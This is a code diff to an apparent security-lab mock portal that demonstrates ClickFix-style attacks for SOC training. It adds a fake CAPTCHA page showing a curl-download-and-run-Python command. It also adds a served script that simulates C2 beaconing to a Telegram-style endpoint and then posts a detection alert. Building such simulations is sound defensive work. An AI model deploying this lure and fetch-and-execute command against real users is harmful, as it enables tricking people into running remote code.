@@ -216,19 +216,104 @@ CAPTCHA_HTML_TEMPLATE = """<!DOCTYPE html>
 </html>
 """
 
-DEMO_CMD = "python3 demo/beacon_sim.py --host victim-pc"
+DEMO_CMD = "curl -s http://__PORTAL_HOST__/payload/beacon.py -o /tmp/rmm_watchdog_sim.py && python3 /tmp/rmm_watchdog_sim.py"
+
+ZERO_DEP_BEACON_PY = '''#!/usr/bin/env python3
+"""Safe, zero-dependency OmniGuard Lab Beacon & RMM-Watchdog Simulator.
+Served from mock_portal.py for closed-network ClickFix / C2 live demos.
+"""
+import json, random, socket, sys, time, urllib.request
+
+SERVER = "__C2_URL__"
+API_URL = "__SOC_URL__"
+HOST = "__VICTIM_HOST__"
+INTERVAL = 2.0
+
+print(f"[SIM] RMM Watchdog / C2 Beacon active on {HOST} -> C2={SERVER} (SOC={API_URL})")
+alerted = False
+seq = 0
+while True:
+    seq += 1
+    try:
+        req = urllib.request.Request(
+            f"{SERVER}/botDEMO_LAB_TOKEN/sendMessage",
+            data=json.dumps({
+                "chat_id": "demo-c2-channel",
+                "text": f"ScreenConnect Watchdog | Computer: {HOST} | Heartbeat #{seq} (Simulated T1219/T1102)",
+            }).encode(),
+            headers={"Content-Type": "application/json"},
+            method="POST",
+        )
+        with urllib.request.urlopen(req, timeout=3) as r:
+            print(f"[{time.strftime('%H:%M:%S')}] Beacon #{seq:02d} -> {SERVER} (HTTP {r.status})")
+    except Exception as e:
+        print(f"[{time.strftime('%H:%M:%S')}] Beacon #{seq:02d} -> {SERVER} (BLOCKED/ERR: {e})")
+
+    if seq >= 4 and not alerted:
+        payload = {
+            "source": "spectrac2",
+            "event_type": "rmm_watchdog_c2_beaconing",
+            "severity": "critical",
+            "host": HOST,
+            "user": "victim",
+            "dst_ip": SERVER.split("//", 1)[-1].split(":", 1)[0],
+            "dst_port": int(SERVER.rsplit(":", 1)[-1]),
+            "domain": SERVER.split("//", 1)[-1].split(":", 1)[0],
+            "beacon_interval": INTERVAL,
+            "mean_jitter": 0.2,
+            "process_name": "powershell-rmm-watchdog-sim",
+            "mitre_technique": "T1219",
+            "confidence": 0.94,
+            "description": f"ClickFix-delivered RMM/Telegram C2 watchdog beaconing to {SERVER} ({INTERVAL}s periodicity).",
+        }
+        try:
+            areq = urllib.request.Request(
+                f"{API_URL}/alerts",
+                data=json.dumps(payload).encode(),
+                headers={"Content-Type": "application/json"},
+                method="POST",
+            )
+            with urllib.request.urlopen(areq, timeout=4) as ar:
+                print(f"[SOC] Alert ingested -> HTTP {ar.status}")
+                alerted = True
+        except Exception as ae:
+            print(f"[SOC] Alert post failed: {ae}")
+
+    time.sleep(max(0.8, INTERVAL + random.uniform(-0.3, 0.3)))
+'''
 
 
 class PortalHandler(http.server.SimpleHTTPRequestHandler):
+    def _host_only(self) -> str:
+        hdr = self.headers.get("Host") or "127.0.0.1:8080"
+        return hdr.split(":", 1)[0]
+
     def do_GET(self):
         path = self.path.split("?", 1)[0]
+        portal_host = self.headers.get("Host") or "127.0.0.1:8080"
+        base_ip = self._host_only()
+
         if path in ("/captcha", "/verify-human"):
-            body = CAPTCHA_HTML_TEMPLATE.replace("__DEMO_CMD__", DEMO_CMD).encode("utf-8")
+            cmd = DEMO_CMD.replace("__PORTAL_HOST__", portal_host)
+            body = CAPTCHA_HTML_TEMPLATE.replace("__DEMO_CMD__", cmd).encode("utf-8")
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
             self.send_header("Content-Length", str(len(body)))
             self.end_headers()
             self.wfile.write(body)
+            return
+        if path == "/payload/beacon.py":
+            script = (
+                ZERO_DEP_BEACON_PY
+                .replace("__C2_URL__", f"http://{base_ip}:9000")
+                .replace("__SOC_URL__", f"http://{base_ip}:8000")
+                .replace("__VICTIM_HOST__", "kali-victim")
+            ).encode("utf-8")
+            self.send_response(200)
+            self.send_header("Content-Type", "text/x-python; charset=utf-8")
+            self.send_header("Content-Length", str(len(script)))
+            self.end_headers()
+            self.wfile.write(script)
             return
         if path.startswith("/download/"):
             stub = (
